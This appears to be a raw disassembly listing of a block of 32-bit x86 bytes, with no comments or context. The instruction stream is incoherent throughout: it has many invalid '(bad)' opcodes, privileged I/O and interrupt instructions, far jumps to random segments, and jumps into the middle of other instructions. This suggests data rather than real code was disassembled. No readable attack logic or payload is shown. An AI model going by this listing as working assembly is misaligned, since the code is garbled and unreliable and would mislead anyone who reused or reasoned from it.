  40e1bd:	jmp    0xb6d9:0xdbecb1b6
  40e1c4:	fucomip st,st(3)
  40e1c6:	ffreep st(3)
  40e1c8:	(bad)  
  40e1c9:	mov    edi,0xc5e1bfd2
  40e1ce:	loop   0x40e196
  40e1d0:	out    dx,eax
  40e1d1:	(bad)  
  40e1d2:	dec    DWORD PTR [eax]
  40e1d4:	fsubr  st(3),st
  40e1d6:	fmul   st,st(6)
  40e1d8:	lock scas eax,DWORD PTR es:[edi]
  40e1da:	in     al,dx
  40e1db:	scas   eax,DWORD PTR es:[edi]
  40e1dc:	leave  
  40e1dd:	leave  
  40e1de:	rcl    dh,0xfb
  40e1e1:	retf   
  40e1e2:	std    
  40e1e3:	cli    
  40e1e4:	jmp    0xd13ebbe0
  40e1e9:	iret   
  40e1ea:	int    0xf9
  40e1ec:	add    DWORD PTR [edi],eax
  40e1ee:	retf   0xf406
  40e1f1:	leave  
  40e1f2:	hlt    
  40e1f3:	(bad)  
  40e1f5:	cli    
  40e1f6:	add    al,0xc0
  40e1f8:	ret    
  40e1f9:	scas   eax,DWORD PTR es:[edi]
  40e1fa:	jecxz  0x40e1d2
  40e1fc:	jmp    0xfff5cde2
  40e201:	jmp    0xd4fed1fa
  40e206:	mov    esp,0xf7dcb9e2
  40e20b:	cli    
  40e20c:	icebp  
  40e20d:	out    0xc1,eax
  40e20f:	out    0xfa,al
  40e211:	neg    ebp
  40e213:	retf   
  40e214:	std    
  40e215:	out    dx,al
  40e216:	out    dx,eax
  40e217:	ror    al,0xee
  40e21a:	ret    0xc3cf
  40e21d:	xlat   BYTE PTR ds:[ebx]
  40e21e:	in     eax,0xd4
  40e220:	hlt    
  40e221:	(bad)  
  40e222:	xlat   BYTE PTR ds:[ebx]
  40e223:	mov    eax,0xbce3cbf1
  40e228:	std    
  40e229:	rol    esi,1
  40e22b:	int3   
  40e22c:	jmp    0x40e1f4
  40e22e:	fld    QWORD PTR [esi]
  40e230:	add    al,ah
  40e232:	clts   
  40e234:	(bad)  
  40e235:	fsubr  st(6),st
  40e237:	enter  0xf1c1,0xc7
  40e23b:	loopne 0x40e20f
  40e23d:	mov    dl,0xf5
  40e23f:	mov    bl,0xcc
  40e241:	into   
  40e242:	into   
  40e243:	mov    edi,0xe1fac9e3
  40e248:	iret   
  40e249:	xlat   BYTE PTR ds:[ebx]
  40e24a:	fucomip st,st(4)
  40e24c:	jecxz  0x40e233
  40e24e:	out    0xf1,eax
  40e250:	fsub   st(7),st
  40e252:	(bad)  
  40e253:	clc    
  40e254:	fxam   
  40e256:	icebp  
  40e257:	scas   al,BYTE PTR es:[edi]
  40e258:	scas   al,BYTE PTR es:[edi]
  40e259:	int3   
  40e25a:	call   0xe825b12f
  40e25f:	lock cli 
  40e261:	cli    
  40e262:	fidiv  DWORD PTR [esi-0x274b3607]
  40e268:	hlt    
  40e269:	int    0xc2
  40e26b:	mov    BYTE PTR [ebx],0xd8
  40e26e:	loopne 0x40e247
  40e270:	(bad)  
  40e271:	jmp    0x40e261
  40e273:	fucomi st,st(1)
  40e275:	add    bh,bh
  40e277:	sar    BYTE PTR [edi+ebx*8-0x4f4a3614],0xe6
  40e27f:	lock clc 
  40e281:	(bad)  
  40e283:	mov    ebp,0xd9d4cfce
  40e288:	fild   DWORD PTR [edi]
  40e28a:	pop    es
  40e28b:	ret    
  40e28c:	in     al,dx
  40e28d:	fsqrt  
  40e28f:	(bad)  
  40e290:	jmp    0x40e28c
  40e292:	in     al,0xef
  40e294:	or     edi,edx
  40e296:	into   
  40e297:	lods   eax,DWORD PTR ds:[esi]
  40e298:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e299:	jmp    0x40e290
  40e29b:	mov    ebp,0xf8b4e3e2
  40e2a0:	icebp  
  40e2a1:	enter  0xcdf1,0xcf
  40e2a5:	in     eax,dx
  40e2a6:	stc    
  40e2a7:	fild   DWORD PTR [eax]
  40e2a9:	div    ah
  40e2ab:	aam    0xc6
  40e2ad:	fcom   st(4)
  40e2af:	jmp    0x40e2af
  40e2b1:	add    al,BYTE PTR [eax]
  40e2b3:	add    BYTE PTR [ebx],dl
  40e2b5:	(bad)  
  40e2b6:	bswap  ecx
  40e2b8:	loope  0x40e297
  40e2ba:	out    0xaf,eax
  40e2bc:	jmp    0xe92bbab1
  40e2c1:	shr    ebx,cl
  40e2c3:	icebp  
  40e2c4:	mov    edx,0xd9dff4d5
  40e2c9:	in     eax,dx
  40e2ca:	shl    dh,1
  40e2cc:	rcr    edi,0xf8
  40e2cf:	retf   
  40e2d0:	jmp    0x40e29d
  40e2d2:	retf   
  40e2d3:	cmc    
  40e2d4:	add    al,0xce
  40e2d6:	or     dl,cl
  40e2d8:	mov    edi,0xf1c7c7bc
  40e2dd:	lods   al,BYTE PTR ds:[esi]
  40e2de:	imul   ecx
  40e2e0:	fdivr  st,st(1)
  40e2e2:	retf   
  40e2e3:	out    dx,eax
  40e2e4:	mov    ecx,0xdcfbdbce
  40e2e9:	clc    
  40e2ea:	shl    esi,0xc6
  40e2ed:	std    
  40e2ee:	out    0xfe,eax
  40e2f0:	ret    0xfadd
  40e2f3:	or     bl,bh
  40e2f5:	int    0xa
  40e2f7:	loopne 0x40e2e1
  40e2f9:	in     eax,dx
  40e2fa:	retf   0xc8b0
  40e2fd:	mov    al,0xa8
  40e2ff:	into   
  40e300:	fcmovb st,st(6)
  40e302:	mov    ah,0xe9
  40e304:	fcmovbe st,st(2)
  40e306:	into   
  40e307:	shl    dl,cl
  40e309:	hlt    
  40e30a:	sti    
  40e30b:	pop    es
  40e30c:	sar    edx,cl
  40e30e:	(bad)  
  40e310:	ret    0x1f8
  40e313:	push   es
  40e314:	pop    es
  40e315:	int    0xe1
  40e317:	mov    ecx,0xbdc4bef2
  40e31c:	mov    dh,0xea
  40e31e:	(bad)  
  40e31f:	retf   0xcdb2
  40e322:	mov    eax,0xbaf6ddf2
  40e327:	ffree  st(3)
  40e329:	out    dx,al
  40e32a:	add    ebx,edi
  40e32c:	add    edi,ebx
  40e32e:	add    ecx,ebx
  40e330:	add    eax,0xe70cc0db
  40e335:	pop    es
  40e336:	(bad)  
  40e337:	in     al,dx
  40e338:	retf   0xd2f3
  40e33b:	div    BYTE PTR [ebx-0x14241a30]
  40e341:	hlt    
  40e342:	xlat   BYTE PTR ds:[ebx]
  40e343:	jmp    0xbcb8:0xb8fec3ea
  40e34a:	pop    es
  40e34b:	add    BYTE PTR [ecx+edi*4-0x392f200c],bh
  40e352:	add    al,0xeb
  40e354:	out    0xe7,al
  40e356:	jmp    0xf4cb:0xe8ccc6f1
  40e35d:	repz mov ah,0xd7
  40e360:	retf   
  40e361:	ror    ebx,1
  40e363:	mov    eax,0xeed2d4ba
  40e368:	mov    edi,0xc7bfe5dd
  40e36d:	or     eax,DWORD PTR ds:0xe5c1c4e0
  40e373:	ffree  st(4)
  40e375:	or     cl,BYTE PTR [edi]
  40e377:	loope  0x40e338
  40e379:	mov    esi,0xe7f5f2ae
  40e37e:	shl    BYTE PTR [ecx-0x2e0b403a],0xdd
  40e385:	(bad)  
  40e387:	cli    
  40e388:	shl    bh,0xf4
  40e38b:	fcomip st,st(0)
  40e38d:	or     ebx,ecx
  40e38f:	loopne 0x40e373
  40e391:	(bad)  
  40e392:	(bad)  
  40e394:	loop   0x40e392
  40e396:	(bad)  
  40e398:	call   0xb7109067
  40e39d:	enter  0xebd5,0xb8
  40e3a1:	in     eax,dx
  40e3a2:	icebp  
  40e3a3:	(bad)  
  40e3a5:	mov    esi,0xf2f1f201
  40e3aa:	(bad)  
  40e3ac:	out    0xe5,eax
  40e3ae:	(bad)  
  40e3b0:	clc    
  40e3b1:	mov    ebp,0xadff8ff
  40e3b6:	add    al,ch
  40e3b8:	fsubr  QWORD PTR [edi-0x281e0f42]
  40e3be:	ror    esi,cl
  40e3c0:	mov    ecx,0xebb8beb4
  40e3c5:	out    dx,eax
  40e3c6:	shl    cl,1
  40e3c8:	out    dx,eax
  40e3c9:	test   ch,0xfe
  40e3cc:	(bad)  
  40e3ce:	fsubrp st(1),st
  40e3d0:	fdiv   st(4),st
  40e3d2:	push   cs
  40e3d3:	stc    
  40e3d4:	repz ror ecx,cl
  40e3d7:	out    dx,al
  40e3d8:	lods   al,BYTE PTR ds:[esi]
  40e3d9:	mov    esp,0xc6d4b0ad
  40e3de:	jmp    0xca06b992
  40e3e3:	mov    eax,0xbadddfba
  40e3e8:	int    0xdc
  40e3ea:	not    ah
  40e3ec:	add    al,0xe1
  40e3ee:	(bad)  
  40e3ef:	cli    
  40e3f0:	or     dh,ch
  40e3f2:	jmp    0x40e3ef
  40e3f4:	add    al,0x5
  40e3f6:	add    al,0xe9
  40e3f8:	in     al,dx
  40e3f9:	icebp  
  40e3fa:	xlat   BYTE PTR ds:[ebx]
  40e3fb:	xlat   BYTE PTR ds:[ebx]
  40e3fc:	aam    0xdb
  40e3fe:	mov    edx,0xe9e6b1f3
  40e403:	icebp  
  40e404:	fcmove st,st(6)
  40e406:	jecxz  0x40e3cb
  40e408:	cmc    
  40e409:	out    dx,al
  40e40a:	mov    eax,0xff05d6e1
  40e40f:	add    eax,0x9cb02de
  40e414:	hlt    
  40e415:	adc    cl,BYTE PTR [edx]
  40e417:	out    0xd8,eax
  40e419:	mov    ebp,0xd4eec2b3
  40e41e:	leave  
  40e41f:	fidiv  DWORD PTR [ecx+ebx*8-0x310a0635]
  40e426:	(bad)  
  40e427:	mov    bh,0xed
  40e429:	in     eax,dx
  40e42a:	ret    0xd4fd
  40e42d:	sar    ecx,cl
  40e42f:	loope  0x40e431
  40e431:	vshufpd ymm7,ymm2,ymm7,0xee
  40e436:	(bad)  
  40e437:	out    dx,al
  40e438:	loope  0x40e418
  40e43a:	mov    bl,0xcc
  40e43c:	in     eax,dx
  40e43d:	retf   0xedd9
  40e440:	repz lock mov al,0xfc
  40e444:	int    0xc9
  40e446:	in     eax,dx
  40e447:	sar    BYTE PTR [ecx-0x25012c34],1
  40e44d:	mov    esp,0xf7c001c0
  40e452:	out    0x8,eax
  40e454:	add    ebx,ebx
  40e456:	add    al,0xdf
  40e458:	scas   eax,DWORD PTR es:[edi]
  40e459:	out    0xc3,al
  40e45b:	mov    dl,0xf1
  40e45d:	in     eax,dx
  40e45e:	xlat   BYTE PTR ds:[ebx]
  40e45f:	fnstcw WORD PTR [edx-0x17100813]
  40e465:	loop   0x40e439
  40e467:	add    eax,ecx
  40e469:	cld    
  40e46a:	(bad)  
  40e46c:	loopne 0x40e433
  40e46e:	std    
  40e46f:	out    0xdb,eax
  40e471:	out    dx,al
  40e472:	call   0x139b254
  40e477:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e478:	ffreep st(4)
  40e47a:	mov    ebp,0xc8dbc1f1
  40e47f:	ror    dl,cl
  40e481:	dec    al
  40e483:	jmp    ebx
  40e485:	(bad)  
  40e487:	mov    edi,0xbbbed6ef
  40e48c:	dec    ebx
  40e48e:	out    0xf9,al
  40e490:	loop   0x40e499
  40e492:	fiadd  DWORD PTR [esi]
  40e494:	add    al,0xf3
  40e496:	enter  0xa6c3,0xd2
  40e49a:	(bad)  
  40e49b:	repz jmp 0xfdd9:0xd0c0b4b1
  40e4a3:	retf   
  40e4a4:	retf   
  40e4a5:	mov    ch,0xf6
  40e4a7:	int3   
  40e4a8:	fst    st(6)
  40e4aa:	shl    ebx,0x6
  40e4ad:	xlat   BYTE PTR ds:[ebx]
  40e4ae:	ret    0xcbdd
  40e4b1:	dec    edx
  40e4b3:	hlt    
  40e4b4:	push   cs
  40e4b5:	out    dx,al
  40e4b6:	in     eax,0xf0
  40e4b8:	shr    DWORD PTR [edi-0x32333e30],1
  40e4be:	jmp    0x40e49b
  40e4c0:	out    dx,al
  40e4c1:	mov    dh,0xfe
  40e4c3:	(bad)  
  40e4c5:	jmp    0xdbd0:0xefe8c9ce
  40e4cc:	rcl    eax,1
  40e4ce:	(bad)  
  40e4cf:	or     edi,edi
  40e4d1:	ror    bl,0xda
  40e4d4:	in     al,dx
  40e4d5:	or     eax,0xc5c8efd2
  40e4da:	test   al,0xf3
  40e4dc:	imul   esi
  40e4de:	mov    cl,0xf7
  40e4e0:	(bad)  
  40e4e1:	shl    al,cl
  40e4e3:	repnz cli 
  40e4e5:	fsubr  st(1),st
  40e4e7:	mov    edx,0x3cee2d7
  40e4ec:	lock loopne 0x40e4c8
  40e4ef:	(bad)  
  40e4f0:	(bad)  
  40e4f2:	ffreep st(7)
  40e4f4:	jmp    0xf7eaefd2
  40e4f9:	lods   eax,DWORD PTR ds:[esi]
  40e4fa:	out    dx,eax
  40e4fb:	(bad)  
  40e4fc:	mov    bh,0xca
  40e4fe:	xlat   BYTE PTR ds:[ebx]
  40e4ff:	mov    ebx,0xd3acb1e9
  40e504:	mov    ch,0xd2
  40e506:	std    
  40e507:	add    edi,DWORD PTR [esi-0xf20041f]
  40e50d:	icebp  
  40e50e:	in     al,0xc7
  40e510:	or     al,BYTE PTR [ecx]
  40e512:	(bad)  
  40e514:	loopne 0x40e519
  40e516:	out    0xb3,eax
  40e518:	mov    dh,0xec
  40e51b:	idiv   DWORD PTR [ebp+ecx*8-0x1718243a]
  40e522:	retf   0xd5f0
  40e525:	aam    0xcd
  40e527:	iret   
  40e528:	mov    ecx,0x3d9e6fe
  40e52d:	ret    0xeaea
  40e530:	in     eax,0x8
  40e532:	add    ebx,edi
  40e534:	loope  0x40e53e
  40e536:	fisubr DWORD PTR [edx-0x4e363051]
  40e53c:	int    0xa9
  40e53e:	retf   
  40e53f:	call   0xbc12b835
  40e544:	mov    eax,0xbdb8eeee
  40e549:	mov    ecx,0xffe1fdfc
  40e54e:	or     cl,BYTE PTR [ebx]
  40e550:	add    al,0xeb
  40e552:	add    bl,cl
  40e554:	retf   
  40e555:	add    ch,ah
  40e557:	loop   0x40e517
  40e559:	mov    cl,0xef
  40e55b:	out    0xe9,al
  40e55d:	mov    dh,0xef
  40e55f:	out    dx,eax
  40e560:	mov    dh,0xcb
  40e562:	(bad)  
  40e563:	hlt    
  40e564:	(bad)  
  40e566:	fdivr  st,st(7)
  40e568:	stc    
  40e569:	icebp  
  40e56a:	into   
  40e56b:	mov    ebx,0xdf09f7fc
  40e570:	std    
  40e571:	add    ecx,DWORD PTR [esi]
  40e573:	or     ecx,ecx
  40e575:	add    ebx,ecx
  40e577:	(bad)  
  40e578:	repnz int 0xbe
  40e57b:	loopne 0x40e573
  40e57d:	iret   
  40e57e:	int    0xb4
  40e580:	mov    dl,0xeb
  40e582:	mov    eax,0xcecef8b7
  40e587:	into   
  40e588:	mul    cl
  40e58a:	mov    eax,0x504c4ec
  40e58f:	call   0x516c9a3
  40e594:	out    0xc9,eax
  40e596:	or     esi,ecx
  40e598:	repnz mov dl,0xdc
  40e59b:	in     eax,dx
  40e59c:	out    0xf1,eax
  40e59e:	mov    dh,0xc6
  40e5a0:	leave  
  40e5a1:	stc    
  40e5a2:	mov    ebx,0xf2e3dcdf
  40e5a7:	std    
  40e5a8:	rcr    ecx,0xd5
  40e5ab:	repz fsub st,st(4)
  40e5ae:	cld    
  40e5af:	in     al,0xff
  40e5b1:	hlt    
  40e5b2:	(bad)  
  40e5b3:	in     eax,0xfb
  40e5b5:	sti    
  40e5b6:	call   0xc5f3aa8c
  40e5bb:	imul   BYTE PTR [esi-0x3710111b]
  40e5c1:	mov    al,0xe5
  40e5c3:	retf   
  40e5c4:	mov    eax,0xcfe0eded
  40e5c9:	rol    DWORD PTR [esi],0xd5
  40e5cc:	(bad)  
  40e5cd:	sar    esi,cl
  40e5cf:	loop   0x40e59b
  40e5d1:	add    eax,0xb02cd01
  40e5d6:	repnz mov dl,0xc3
  40e5d9:	mov    edi,0xc8d1f0e1
  40e5de:	lods   al,BYTE PTR ds:[esi]
  40e5df:	repz call 0xc8f7d59d
  40e5e5:	mov    ecx,0xc103cfed
  40e5ea:	repz fdivr QWORD PTR [ebp-0x1c272827]
  40e5f1:	(bad)  
  40e5f2:	retf   0x502
  40e5f5:	bswap  esi
  40e5f7:	shl    ah,1
  40e5f9:	mov    edi,0xacadaec5
  40e5fe:	fcmovbe st,st(2)
  40e600:	out    dx,al
  40e601:	lods   eax,DWORD PTR ds:[esi]
  40e602:	leave  
  40e603:	idiv   BYTE PTR [edx-0x1310]
  40e609:	loope  0x40e602
  40e60b:	sar    al,0xd0
  40e60e:	jmp    0xe4e0:0xfcdbd7ca
  40e615:	jmp    eax
  40e617:	shr    eax,1
  40e619:	mov    al,0xf2
  40e61b:	icebp  
  40e61c:	shl    DWORD PTR [eax-0x3b3b110c],cl
  40e622:	test   eax,0xbffcdbb4
  40e628:	icebp  
  40e629:	loopne 0x40e5ec
  40e62b:	sar    BYTE PTR [edx+0x202f1fe],cl
  40e631:	aad    0x9
  40e633:	call   0xc23bcb3c
  40e638:	call   0xd825d92c
  40e63d:	out    0xb2,eax
  40e63f:	mov    bh,0xf3
  40e641:	fcmovnbe st,st(4)
  40e643:	neg    bl
  40e645:	ror    edx,cl
  40e647:	loopne 0x40e5ff
  40e649:	out    dx,eax
  40e64a:	mov    edi,0xd8c3d8bb
  40e64f:	loope  0x40e64d
  40e651:	retf   
  40e652:	aad    0xe6
  40e654:	stc    
  40e655:	stc    
  40e656:	repz mov ebp,0xcbc2b0be
  40e65c:	scas   al,BYTE PTR es:[edi]
  40e65d:	out    0xcf,eax
  40e65f:	iret   
  40e660:	repnz (bad) 
  40e663:	(bad)  
  40e665:	in     eax,dx
  40e666:	xlat   BYTE PTR ds:[ebx]
  40e667:	(bad)  
  40e668:	mov    edx,0xe2d9f4df
  40e66d:	cmc    
  40e66e:	or     ebp,eax
  40e670:	hlt    
  40e671:	retf   
  40e672:	(bad)  
  40e674:	pop    es
  40e675:	iret   
  40e676:	out    dx,eax
  40e677:	jmp    0x40e64a
  40e679:	test   eax,0xa9ccefc1
  40e67e:	loopne 0x40e650
  40e680:	mov    ebx,0xdffaecd3
  40e685:	mov    ebx,0xfce3ddcf
  40e68a:	xlat   BYTE PTR ds:[ebx]
  40e68b:	sar    dl,1
  40e68d:	in     al,0xe4
  40e68f:	hlt    
  40e690:	rcr    al,0xf
  40e693:	or     eax,0xb8fce5cd
  40e698:	mov    esi,0xe7f6c6f0
  40e69d:	repz test al,0xb4
  40e6a0:	rol    ah,1
  40e6a2:	into   
  40e6a3:	cli    
  40e6a4:	les    edi,FWORD PTR [ebx+esi*8-0x3fc09ff]
  40e6ab:	fadd   DWORD PTR [edx]
  40e6ad:	mov    ebp,0xc70407eb
  40e6b2:	aad    0xcd
  40e6b4:	or     BYTE PTR ds:0xbcf3cdda,al
  40e6ba:	loope  0x40e6b1
  40e6bc:	leave  
  40e6bd:	iret   
  40e6be:	out    0xe9,al
  40e6c0:	mov    al,0xdb
  40e6c2:	aam    0xdd
  40e6c4:	enter  0xdbc3,0xfc
  40e6c8:	mov    esi,0xe3d0ddc7
  40e6cd:	(bad)  
  40e6ce:	retf   
  40e6cf:	add    eax,0xd4c8c5e6
  40e6d4:	loope  0x40e6d7
  40e6d6:	push   es
  40e6d7:	in     eax,0xbe
  40e6d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6da:	loope  0x40e69d
  40e6dc:	jecxz  0x40e6d0
  40e6de:	idiv   bl
  40e6e0:	mov    eax,0xd6caf5b7
  40e6e5:	repnz int 0xb7
  40e6e8:	icebp  
  40e6e9:	shl    BYTE PTR [ebx+edx*8-0x1b0a0f2f],0xe8
  40e6f1:	(bad)  
  40e6f3:	pop    es
  40e6f4:	jmp    0x40e6ce
  40e6f6:	out    0xce,al
  40e6f8:	shl    BYTE PTR [eax-0x284a3d14],0xb3
  40e6ff:	icebp  
  40e700:	xlat   BYTE PTR ds:[ebx]
  40e701:	sar    DWORD PTR [ecx-0x47411442],1
  40e707:	call   ecx
  40e709:	std    
  40e70a:	clc    
  40e70b:	shl    edi,0xc3
  40e70e:	jmp    0xeac3:0xe5c5fa00
  40e715:	push   es
  40e716:	std    
  40e717:	jmp    0xe838cd02
  40e71c:	mov    cl,0xc5
  40e71e:	int    0xf7
  40e720:	icebp  
  40e721:	(bad)  
  40e722:	fucomi st,st(0)
  40e724:	mov    ah,0xe9
  40e726:	inc    cl
  40e728:	std    
  40e729:	idiv   BYTE PTR [esi-0x1afb000d]
  40e72f:	add    al,0xf0
  40e731:	add    dl,ch
  40e733:	fucomp st(3)
  40e735:	fst    st(3)
  40e737:	mov    eax,0xe8ccc5ce
  40e73c:	leave  
  40e73d:	test   eax,0xe6b6f4b2
  40e742:	cmc    
  40e743:	in     eax,0xbe
  40e745:	int3   
  40e746:	loope  0x40e736
  40e748:	cli    
  40e749:	not    edx
  40e74b:	rcr    cl,1
  40e74d:	test   BYTE PTR [eax],0xdb
  40e750:	push   es
  40e751:	in     eax,0xd9
  40e753:	or     al,0x1
  40e755:	psubusb mm6,mm0
  40e758:	mov    eax,0xaed0f5cd
  40e75d:	jmp    0xed2ede24
  40e762:	mov    al,0xb5
  40e764:	mov    edx,0xf6c2fdf3
  40e769:	lock add eax,0xc4e5f6be
  40e76f:	mov    edi,0xeeebbd00
  40e774:	jmp    0xe4ed:0xd3a8090c
  40e77b:	mov    dh,0xca
  40e77d:	(bad)
  40e780:	rcl    esi,cl
  40e782:	out    0xd2,al
  40e784:	int    0xca
  40e786:	loop   0x40e764
  40e788:	stc    
  40e789:	aam    0xbe
  40e78b:	(bad)  
  40e78c:	(bad)  
  40e78e:	fadd   st(5),st
  40e790:	aad    0xc4
  40e792:	add    DWORD PTR [edi],eax
  40e794:	leave  
  40e795:	ror    esi,0xe6
  40e798:	into   
  40e799:	div    bl
  40e79b:	int3   
  40e79c:	leave  
  40e79d:	shr    al,cl
  40e79f:	(bad)  
  40e7a0:	(bad)  
  40e7a3:	cli    
  40e7a4:	fdivr  st(7),st
  40e7a6:	cmc    
  40e7a7:	(bad)  
  40e7a9:	in     eax,dx
  40e7aa:	mov    esp,0x2fdbcf3
  40e7af:	ret    
  40e7b0:	std    
  40e7b1:	clc    
  40e7b2:	cld    
  40e7b3:	enter  0xc1f3,0xe9
  40e7b7:	(bad)  
  40e7b8:	loopne 0x40e778
  40e7ba:	out    dx,al
  40e7bb:	xlat   BYTE PTR ds:[ebx]
  40e7bc:	mov    bl,0xc6
  40e7be:	shl    DWORD PTR [edx-0x42324f25],cl
  40e7c4:	add    edi,ebx
  40e7c6:	retf   0xbcfd
  40e7c9:	into   
  40e7ca:	mov    edi,0xddc2c6f4
  40e7cf:	add    ecx,edx
  40e7d1:	cld    
  40e7d2:	in     al,0xd5
  40e7d4:	enter  0xedc4,0xe4
  40e7d8:	mov    cl,0xbe
  40e7da:	jmp    0x40e7b8
  40e7dc:	out    dx,eax
  40e7dd:	int3   
  40e7de:	not    eax
  40e7e0:	shl    al,1
  40e7e2:	imul   ch
  40e7e4:	mov    edx,0xd4dabefc
  40e7e9:	mov    ch,0xd8
  40e7eb:	add    al,0xd1
  40e7ed:	add    edi,edi
  40e7ef:	fcmovnb st,st(6)
  40e7f1:	jmp    0xfc26e0b2
  40e7f6:	add    ch,cl
  40e7f8:	loopne 0x40e7eb
  40e7fa:	int3   
  40e7fb:	leave  
  40e7fc:	shl    cl,1
  40e7fe:	loope  0x40e7da
  40e800:	mov    bh,0xd0
  40e802:	mov    al,0xb7
  40e804:	mov    ah,0xe3
  40e806:	fidivr DWORD PTR [ecx-0x1b431f25]
  40e80c:	add    eax,0xe70507d1
  40e811:	bsf    eax,DWORD PTR [esi]
  40e814:	add    eax,0xaaade4fd
  40e819:	jmp    0x40e7dd
  40e81b:	ret    0xe6c2
  40e81e:	iret   
  40e81f:	retf   
  40e820:	jmp    0x40e820
  40e822:	rcr    ah,1
  40e824:	hlt    
  40e825:	(bad)  
  40e827:	aam    0xbe
  40e829:	repnz shl ecx,1
  40e82c:	aam    0xfc
  40e82e:	clc    
  40e82f:	add    ebp,esp
  40e831:	or     dl,bl
  40e833:	stc    
  40e834:	in     al,0xf3
  40e836:	retf   
  40e837:	scas   eax,DWORD PTR es:[edi]
  40e838:	xlat   BYTE PTR ds:[ebx]
  40e839:	ret    
  40e83a:	loopne 0x40e80d
  40e83c:	loop   0x40e804
  40e83e:	sti    
  40e83f:	out    0xe4,al
  40e841:	in     al,dx
  40e842:	out    0xdd,al
  40e844:	cld    
  40e845:	ret    
  40e846:	jmp    0xf2fc:0xd7b9f5f7
  40e84d:	hlt    
  40e84e:	test   BYTE PTR [edi],0xe0
  40e851:	out    0xb,eax
  40e853:	out    0xe9,al
  40e855:	push   es
  40e856:	adc    eax,edx
  40e858:	jmp    0xc6f1e029
  40e85d:	repnz repz in al,0xce
  40e861:	out    0xba,al
  40e863:	mov    ebx,0xb9d4efc9
  40e868:	int3   
  40e869:	pop    es
  40e86a:	xlat   BYTE PTR ds:[ebx]
  40e86b:	cli    
  40e86c:	aam    0xe3
  40e86e:	in     al,0xca
  40e870:	or     al,BYTE PTR ds:0xfcecc906
  40e876:	jmp    0xc920ca62
  40e87b:	in     eax,dx
  40e87c:	hlt    
  40e87d:	jecxz  0x40e830
  40e87f:	mov    edx,0xf6e6cdc0
  40e884:	mov    dh,0xdc
  40e886:	ret    0xd6bb
  40e889:	hlt    
  40e88a:	push   es
  40e88b:	(bad)  
  40e88c:	inc    BYTE PTR [edi]
  40e88e:	push   es
  40e88f:	hlt    
  40e890:	push   es
  40e891:	jecxz  0x40e894
  40e893:	or     al,0xf
  40e895:	or     eax,0xc9bcc904
  40e89a:	rol    edx,cl
  40e89c:	jecxz  0x40e873
  40e89e:	out    dx,al
  40e89f:	jmp    0x40e874
  40e8a1:	mov    eax,0xfcfff7b9
  40e8a6:	mov    ebp,0xf2ecd9d7
  40e8ab:	add    esp,esi
  40e8ad:	fucomp st(1)
  40e8af:	hlt    
  40e8b0:	enter  0xe7d5,0xdb
  40e8b4:	sti    
  40e8b5:	jmp    0x40e8bc
  40e8b7:	retf   
  40e8b8:	fucomp st(3)
  40e8ba:	iret   
  40e8bb:	(bad)  
  40e8bc:	in     eax,0xb1
  40e8be:	in     al,dx
  40e8bf:	loopne 0x40e86f
  40e8c1:	lods   eax,DWORD PTR ds:[esi]
  40e8c2:	mov    ebx,0xeecbefca
  40e8c7:	test   DWORD PTR [edx],0xc2d2e1e2
  40e8cd:	(bad)  
  40e8ce:	repnz (bad) 
  40e8d0:	std    
  40e8d1:	push   cs
  40e8d2:	out    0x5,eax
  40e8d4:	retf   0xd9f8
  40e8d7:	(bad)
  40e8da:	lods   eax,DWORD PTR ds:[esi]
  40e8db:	hlt    
  40e8dc:	int3   
  40e8dd:	retf   
  40e8de:	mov    edx,0xbee5e6f4
  40e8e3:	(bad)  
  40e8e4:	std    
  40e8e5:	jmp    0xda1fbddd
  40e8ea:	fdivr  st,st(6)
  40e8ec:	repnz add eax,0xdde6d106
  40e8f2:	pop    es
  40e8f3:	fisttp DWORD PTR [edx]
  40e8f5:	fdivrp st(1),st
  40e8f7:	jmp    0x40e8eb
  40e8f9:	in     eax,dx
  40e8fa:	mov    al,0xf4
  40e8fc:	sar    ebx,cl
  40e8fe:	out    dx,eax
  40e8ff:	mov    bh,0xd4
  40e901:	out    0xff,al
  40e903:	fprem  
  40e905:	jecxz  0x40e90a
  40e907:	jmp    0xd108b9d4
  40e90c:	sti    
  40e90d:	cmc    
  40e90e:	retf   
  40e90f:	loopne 0x40e8d2
  40e911:	or     ecx,DWORD PTR [eax]
  40e913:	clc    
  40e914:	enter  0xd2dc,0xb3
  40e918:	out    dx,al
  40e919:	mov    bh,0xe9
  40e91b:	in     eax,dx
  40e91c:	repz mov ah,0xf0
  40e91f:	mov    cl,0xc0
  40e921:	mov    bh,0xc8
  40e923:	jmp    0xcde2:0xf3b9b9cb
  40e92a:	(bad)  
  40e92b:	fprem  
  40e92d:	or     ch,bl
  40e92f:	std    
  40e930:	vpsubsw ymm7,ymm1,ymm3
  40e934:	int3   
  40e935:	fucomp st(3)
  40e937:	iret   
  40e938:	jmp    0x40e8ed
  40e93a:	shr    BYTE PTR [esi-0xf49114d],cl
  40e940:	rcl    cl,1
  40e942:	jmp    0x2f6:0xfae9d8bb
  40e949:	int    0xf9
  40e94b:	ret    
  40e94c:	neg    edx
  40e94e:	icebp  
  40e94f:	rcl    esi,1
  40e951:	neg    edi
  40e953:	in     al,0xea
  40e955:	loopne 0x40e957
  40e957:	test   eax,0xb5d6a5f7
  40e95c:	call   0xc92bb951
  40e961:	int3   
  40e962:	sar    ebx,1
  40e964:	repz (bad) 
  40e966:	mov    ah,0xe8
  40e968:	(bad)  
  40e96a:	hlt    
  40e96b:	(bad)  
  40e96c:	rol    cl,1
  40e96e:	ret    0xe1e5
  40e971:	leave  
  40e972:	or     bh,bl
  40e974:	loopne 0x40e945
  40e976:	or     DWORD PTR [ecx-0x280e4d38],edi
  40e97c:	int    0xc7
  40e97e:	enter  0xfad7,0xb0
  40e982:	cli    
  40e983:	fsubr  st,st(1)
  40e985:	jmp    0x40e988
  40e987:	add    dl,dh
  40e989:	add    al,bh
  40e98b:	push   es
  40e98c:	faddp  st(0),st
  40e98e:	fild   DWORD PTR ds:0xdbf408d6
  40e994:	add    ebp,esp
  40e996:	rol    edi,cl
  40e998:	repnz scas eax,DWORD PTR es:[edi]
  40e99a:	fst    st(3)
  40e99c:	mov    al,0xc7
  40e99e:	ror    dh,1
  40e9a0:	call   0xdb19b052
  40e9a5:	fnstsw WORD PTR [edi-0x2b29430d]
  40e9ab:	loopne 0x40e990
  40e9ad:	icebp  
  40e9ae:	in     al,0xe2
  40e9b0:	loopne 0x40e98f
  40e9b2:	leave  
  40e9b3:	in     al,dx
  40e9b4:	in     eax,dx
  40e9b5:	jmp    0xb0e9d2cb
